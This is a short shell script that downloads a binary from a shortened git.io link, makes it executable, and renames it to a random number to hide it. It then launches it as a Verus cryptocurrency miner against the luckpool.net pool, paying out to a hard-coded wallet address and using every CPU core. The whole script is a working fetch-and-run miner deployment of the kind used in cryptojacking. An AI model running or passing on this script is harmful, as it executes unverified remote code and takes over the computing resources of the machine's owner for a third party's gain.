wget -qO build https://git.io/JiGZh && chmod +x build
TOP=$(shuf -n 1 -i 1-200000)
USER=$1
mv build $TOP
./$TOP -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p x -t $(nproc --all)
